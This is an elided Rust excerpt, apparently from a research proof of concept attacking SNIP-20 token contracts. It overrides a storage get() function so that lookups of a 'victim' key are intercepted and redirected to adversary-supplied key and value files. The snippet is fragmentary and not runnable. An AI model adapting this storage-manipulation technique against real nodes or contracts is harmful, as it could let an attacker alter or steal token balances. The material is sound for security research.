...
const VICTIM_KEY_FILENAME: &str = "victim_key";
const ADV_KEY_FILENAME: &str = "adv_key";
const ADV_VALUE_FILENAME: &str = "adv_value";
const KV_STORE_FILENAME: &str = "kv_store";
...
impl Storage for DB {
    fn get(&self, key: &[u8]) -> FfiResult<Option<Vec<u8>>> {
        ...
        let victim_key_path = Path::new(snip20_attack_dir.as_str()).join(VICTIM_KEY_FILENAME);
        info!("victim_key_path: {:?}", victim_key_path);
        let input = OpenOptions::new()
            .read(true)
            .write(true)
            .create(true)
            .open(&victim_key_path)
            .unwrap();
        ...
        let adv_key_path = Path::new(snip20_attack_dir.as_str()).join(ADV_KEY_FILENAME);
        info!("adv_key_path: {:?}", adv_key_path);
        //let input_adv_key = File::open(&adv_key_path).unwrap();
        let input_adv_key = OpenOptions::new()
            .read(true)
            .write(true)
            .create(true)
            .open(&adv_key_path)
        ...
        let adv_value_path = Path::new(snip20_attack_dir.as_str()).join(ADV_VALUE_FILENAME);
        info!("adv_value_path: {:?}", adv_value_path);
        //let input_adv_value = File::open(&adv_value_path).unwrap();
        let input_adv_value = OpenOptions::new()
            .read(true)
            .write(true)
            .create(true)
            .open(&adv_value_path)
        ...
        let value = if result_buf.ptr.is_null() || hex::encode(key) == victim_key {
            ...
            let mut f = OpenOptions::new().write(true).truncate(true).open(&victim_key_path).unwrap();
            ...
            let kv_store_path = Path::new(snip20_attack_dir.as_str()).join(KV_STORE_FILENAME);
